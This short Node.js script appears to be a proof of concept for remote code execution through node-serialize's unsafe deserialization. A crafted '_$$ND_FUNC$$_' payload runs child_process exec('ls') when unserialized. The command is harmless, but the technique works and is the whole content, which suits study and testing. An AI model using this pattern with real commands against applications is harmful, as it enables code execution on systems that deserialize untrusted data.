var serialize = require('node-serialize');
var exec = require('child_process').exec;

// var serializedData = '{"test":"_$$ND_FUNC$$_function() {\\n    return \'hi\';\\n  }()"}';
var serializedData = '{"test":"_$$ND_FUNC$$_function() {\\n    exec(\'ls\', function(error, stdout, stderr) {\\n      if (error) {\\n        // console.error(\'Error executing command:\', error);\\n        return;\\n      }\\n      console.log(\'Command output:\', stdout);\\n    });\\n  }()"}';
try {
  var deserializedData = serialize.unserialize(serializedData);
  console.log('Deserialized data:', deserializedData);
  deserializedData.test();
} catch (error) {
  console.error(error);
}